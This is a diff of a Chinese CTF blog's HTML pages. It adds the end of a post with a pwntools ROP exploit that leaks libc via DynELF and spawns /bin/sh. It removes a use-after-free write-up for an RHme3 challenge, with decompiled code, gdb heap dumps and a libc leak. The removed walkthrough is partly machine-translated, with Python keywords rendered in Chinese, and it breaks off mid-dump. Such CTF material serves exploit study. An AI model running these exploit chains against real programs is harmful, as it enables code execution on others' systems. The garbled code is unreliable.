class="comment">#pop rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">rop2 = <span class="number">0x400740</span> <span class="comment">#rdx(r13), rsi(r14), edi(r15d)</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400763</span></span><br><span class="line"><span class="comment"># start_addr = elf.symbols['_start']</span></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">binsh_addr = <span class="number">0x601000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">  payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">  payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">  io.send(payload)</span><br><span class="line">  io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  content = <span class="string">""</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">        content = content[:<span class="number">-1</span>] + <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content += c</span><br><span class="line">        up = c</span><br><span class="line">  content = content[:<span class="number">4</span>]</span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">sys_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">log.info(<span class="string">"system_addr =&gt; %#x"</span>, sys_addr)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(rop1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(binsh_addr) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rop2)</span><br><span class="line">payload += <span class="string">"\x00"</span> * <span class="number">56</span>    <span class="comment">#rop2结束又跳转到rop1，需要再填充7 * 8字节到返回地址</span></span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/13/Boring game/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1449,298 +1765,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/08/uaf实例/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/08/uaf实例/" itemprop="url">uaf实例</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-08T16:01:52+08:00">
-                2019-08-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/百度学习/" itemprop="url" rel="index">
-                    <span itemprop="name">百度学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>RHme3 CTF 的一道题</p>
-<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE         </span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE</span><br><span class="line"></span><br><span class="line">堆的题目基本都是选择菜单，这里可以添加，删除，选择，编辑，展示球员，还可以显示队伍，</span><br><span class="line"></span><br><span class="line">Welcome to your TeamManager (TM)!</span><br><span class="line">0.- Exit</span><br><span class="line">1.- Add player</span><br><span class="line">2.- Remove player</span><br><span class="line">3.- Select player</span><br><span class="line">4.- Edit player</span><br><span class="line">5.- Show player</span><br><span class="line">6.- Show team</span><br><span class="line">Your choice:</span><br><span class="line"></span><br><span class="line">Your choice: 1</span><br><span class="line">Found free slot: 0</span><br><span class="line">Enter player name: 1</span><br><span class="line">Enter attack points: 1</span><br><span class="line">Enter defense points: 1</span><br><span class="line">Enter speed: 1</span><br><span class="line">Enter precision: 1</span><br><span class="line">上面就是球员这个结构有什么信息，第一个free slot就相当于球员的id，这个不用我们输入</span><br><span class="line"></span><br><span class="line">remove就删除咯</span><br><span class="line"></span><br><span class="line">Your choice: 2</span><br><span class="line">Enter index: 0</span><br><span class="line">She<span class="string">'s gone!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select会输出球员的信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your choice: 3</span></span><br><span class="line"><span class="string">Enter index: 0</span></span><br><span class="line"><span class="string">Player selected!</span></span><br><span class="line"><span class="string">    Name: 1</span></span><br><span class="line"><span class="string">    A/D/S/P: 1,1,1,1</span></span><br><span class="line"><span class="string">edit当前的palyer，基于上面的select</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your choice: 4</span></span><br><span class="line"><span class="string">0.- Go back</span></span><br><span class="line"><span class="string">1.- Edit name</span></span><br><span class="line"><span class="string">2.- Set attack points</span></span><br><span class="line"><span class="string">3.- Set defense points</span></span><br><span class="line"><span class="string">4.- Set speed</span></span><br><span class="line"><span class="string">5.- Set precision</span></span><br><span class="line"><span class="string">Your choice:</span></span><br><span class="line"><span class="string">show palyer，这个显示的是select的player</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your choice: 5</span></span><br><span class="line"><span class="string">    Name: 2</span></span><br><span class="line"><span class="string">    A/D/S/P: 1,1,1,1</span></span><br><span class="line"><span class="string">show team会将所有球员信息打印出来</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your choice: 6</span></span><br><span class="line"><span class="string">Your team: </span></span><br><span class="line"><span class="string">Player 0</span></span><br><span class="line"><span class="string">    Name: 2</span></span><br><span class="line"><span class="string">    A/D/S/P: 1,1,1,1</span></span><br><span class="line"><span class="string">Player 1</span></span><br><span class="line"><span class="string">    Name: 3</span></span><br><span class="line"><span class="string">    A/D/S/P: 3,3,3,3</span></span><br><span class="line"><span class="string">经过对add_player的逆向，可以推出palyer的结构</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct palyer&#123;</span></span><br><span class="line"><span class="string">    int attackPoint;</span></span><br><span class="line"><span class="string">    int defensePoints;</span></span><br><span class="line"><span class="string">    int speed;</span></span><br><span class="line"><span class="string">    int precision;</span></span><br><span class="line"><span class="string">    char* name;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">unsigned __int64 delete_player()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  void **ptr; // ST08_8</span></span><br><span class="line"><span class="string">  unsigned int v2; // [rsp+4h] [rbp-1Ch]</span></span><br><span class="line"><span class="string">  char nptr; // [rsp+10h] [rbp-10h]</span></span><br><span class="line"><span class="string">  unsigned __int64 v4; // [rsp+18h] [rbp-8h]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  v4 = __readfsqword(0x28u);</span></span><br><span class="line"><span class="string">  printf("Enter index: ");</span></span><br><span class="line"><span class="string">  fflush(stdout);</span></span><br><span class="line"><span class="string">  readline(&amp;nptr, 4LL);</span></span><br><span class="line"><span class="string">  v2 = atoi(&amp;nptr);</span></span><br><span class="line"><span class="string">  if ( v2 &lt;= 0xA &amp;&amp; players[v2] )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    ptr = (void **)players[v2];</span></span><br><span class="line"><span class="string">    players[v2] = 0LL;</span></span><br><span class="line"><span class="string">    free(ptr[2]);</span></span><br><span class="line"><span class="string">    free(ptr);</span></span><br><span class="line"><span class="string">    puts("She'</span>s gone!<span class="string">");</span></span><br><span class="line"><span class="string">    fflush(stdout);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    puts("</span>Invalid index<span class="string">");</span></span><br><span class="line"><span class="string">    fflush(stdout);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  return __readfsqword(0x28u) ^ v4;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uaf漏洞点</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line">def  alloc（name，attack  =  1， </span><br><span class="line">		   defense  =  2，speed  =  3，precision  =  4）：</span><br><span class="line"></span><br><span class="line">	p.recvuntil（<span class="string">' choice：'</span>）</span><br><span class="line">	p.sendline（<span class="string">' 1 '</span>）</span><br><span class="line"></span><br><span class="line">	p.recvuntil（<span class="string">' name：'</span>）</span><br><span class="line">	p.sendline（名称）</span><br><span class="line"></span><br><span class="line">	p.recvuntil（<span class="string">' points：'</span>）</span><br><span class="line">	p.sendline（str（attack））</span><br><span class="line"></span><br><span class="line">	p.recvuntil（<span class="string">' points：'</span>）</span><br><span class="line">	p.sendline（str（辩护））</span><br><span class="line"></span><br><span class="line">	p.recvuntil（<span class="string">' speed：'</span>）</span><br><span class="line">	p.sendline（str（speed））</span><br><span class="line"></span><br><span class="line">	p.recvuntil（<span class="string">' precision：'</span>）</span><br><span class="line">	p.sendline（str（precision））</span><br><span class="line"></span><br><span class="line">	返回</span><br><span class="line"></span><br><span class="line">def  pwn（）：</span><br><span class="line"></span><br><span class="line">    alloc（<span class="string">' A '</span> * 0x 60）</span><br><span class="line">查看栈的情况</span><br><span class="line">(gdb) x/80gx 0x604000</span><br><span class="line">      0x604000:	0x0000000000000000	0x0000000000000021 &lt;-- player 0 </span><br><span class="line">      0x604010:	0x0000000200000001	0x0000000400000003</span><br><span class="line">      0x604020:	0x0000000000604030	0x0000000000000071</span><br><span class="line">      0x604030:	0x4141414141414141	0x4141414141414141</span><br><span class="line">      0x604040:	0x4141414141414141	0x4141414141414141</span><br><span class="line">      0x604050:	0x4141414141414141	0x4141414141414141</span><br><span class="line">      0x604060:	0x4141414141414141	0x4141414141414141</span><br><span class="line">      0x604070:	0x4141414141414141	0x4141414141414141</span><br><span class="line">      0x604080:	0x4141414141414141	0x4141414141414141</span><br><span class="line">      0x604090:	0x0000000000000000	0x0000000000020f71</span><br><span class="line"></span><br><span class="line">alloc（<span class="string">' B '</span> * 0x 60）</span><br><span class="line"></span><br><span class="line">(gdb) x/80gx 0x604000</span><br><span class="line">0x604000:	0x0000000000000000	0x0000000000000021  &lt;-- player 0</span><br><span class="line">0x604010:	0x0000000200000001	0x0000000400000003</span><br><span class="line">0x604020:	0x0000000000604030	0x0000000000000071</span><br><span class="line">0x604030:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604040:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604050:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604060:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604070:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604080:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604090:	0x0000000000000000	0x0000000000000021 &lt;-- player 1</span><br><span class="line">0x6040a0:	0x0000000200000001	0x0000000400000003</span><br><span class="line">0x6040b0:	0x00000000006040c0	0x0000000000000071</span><br><span class="line">0x6040c0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x6040d0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x6040e0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x6040f0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x604100:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x604110:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x604120:	0x0000000000000000	0x0000000000020ee1</span><br><span class="line"></span><br><span class="line">alloc（<span class="string">' C '</span> * 0x 80）</span><br><span class="line">alloc（<span class="string">' D '</span> * 0x 80）</span><br><span class="line"></span><br><span class="line">(gdb) x/90gx 0x604000</span><br><span class="line">0x604000:	0x0000000000000000	0x0000000000000021 &lt;-- player 0</span><br><span class="line">0x604010:	0x0000000200000001	0x0000000400000003</span><br><span class="line">0x604020:	0x0000000000604030	0x0000000000000071</span><br><span class="line">0x604030:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604040:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604050:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604060:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604070:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604080:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604090:	0x0000000000000000	0x0000000000000021 &lt;-- player 1</span><br><span class="line">0x6040a0:	0x0000000200000001	0x0000000400000003</span><br><span class="line">0x6040b0:	0x00000000006040c0	0x0000000000000071</span><br><span class="line">0x6040c0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x6040d0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x6040e0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x6040f0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x604100:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x604110:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- player 2</span><br><span class="line">0x604130:	0x0000000200000001	0x0000000400000003</span><br><span class="line">0x604140:	0x0000000000604150	0x0000000000000091</span><br><span class="line">0x604150:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x604160:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x604170:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x604180:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x604190:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041a0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041b0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041c0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041d0:	0x0000000000000000	0x0000000000000021 &lt;-- player 3</span><br><span class="line">0x6041e0:	0x0000000200000001	0x0000000400000003</span><br><span class="line">0x6041f0:	0x0000000000604200	0x0000000000000091</span><br><span class="line">0x604200:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x604210:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x604220:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x604230:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x604240:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x604250:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x604260:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x604270:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x604280:	0x0000000000000000	0x0000000000020d81</span><br><span class="line"></span><br><span class="line">select(2)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">(gdb) x/80gx 0x604000</span><br><span class="line">0x604000:	0x0000000000000000	0x0000000000000021 &lt;-- player 0 [<span class="keyword">in</span> use]</span><br><span class="line">0x604010:	0x0000000200000001	0x0000000400000003</span><br><span class="line">0x604020:	0x0000000000604030	0x0000000000000071</span><br><span class="line">0x604030:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604040:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604050:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604060:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604070:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604080:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x604090:	0x0000000000000000	0x0000000000000021 &lt;-- player 1 [<span class="keyword">in</span> use]</span><br><span class="line">0x6040a0:	0x0000000200000001	0x0000000400000003</span><br><span class="line">0x6040b0:	0x00000000006040c0	0x0000000000000071</span><br><span class="line">0x6040c0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x6040d0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x6040e0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x6040f0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x604100:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x604110:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- player 2 [free]</span><br><span class="line">0x604130:	0x0000000000000000	0x0000000400000003</span><br><span class="line">0x604140:	0x0000000000604150	0x0000000000000091</span><br><span class="line">0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8 </span><br><span class="line">0x604160:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x604170:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x604180:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x604190:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041a0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041b0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041c0:	0x4343434343434343	0x4343434343434343</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后 libc的泄露</span><br><span class="line"></span><br><span class="line"><span class="comment"># 'selected'数组包含第3个玩家对象</span></span><br><span class="line">＃我们滥用UAF vuln泄漏libc </span><br><span class="line">＃ show_player只检查<span class="string">'selected'</span>数组是否为空</span><br><span class="line">＃如果不是，它将打印玩家对象的值</span><br><span class="line">＃而不检查如果它实际上是免费的</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line"></span><br><span class="line">leak        = u64(p.recv(6).ljust(8, <span class="string">'\x00'</span>))</span><br><span class="line">libc        = leak - 0x3c17b8</span><br><span class="line">system      = libc + 0x46590</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Leak:   0x&#123;:x&#125;"</span>.format(leak))</span><br><span class="line">log.info(<span class="string">"Libc:   0x&#123;:x&#125;"</span>.format(libc))</span><br><span class="line">log.info(<span class="string">"system: 0x&#123;:x&#125;"</span>.format(system))</span><br><span class="line"></span><br><span class="line">[*] Leak:   0x7ffff7dd37b8</span><br><span class="line">[*] Libc:   0x7ffff7a12000</span><br><span class="line">[*] system: 0x7ffff7a58590</span><br><span class="line"></span><br><span class="line">接下来就要获得任意代码执行</span><br><span class="line"></span><br><span class="line">free(3) <span class="comment">## free掉top chunk前一个</span></span><br><span class="line"></span><br><span class="line">0x604120:	0x0000000000000000	0x00000000000000b1 &lt;-- player 2 [free]</span><br><span class="line">0x604130:	0x00007ffff7dd37b8	0x00007ffff7dd37b8</span><br><span class="line">0x604140:	0x0000000000604150	0x0000000000000091</span><br><span class="line">0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8</span><br><span class="line">0x604160:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x604170:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x604180:	0x4343434343434343	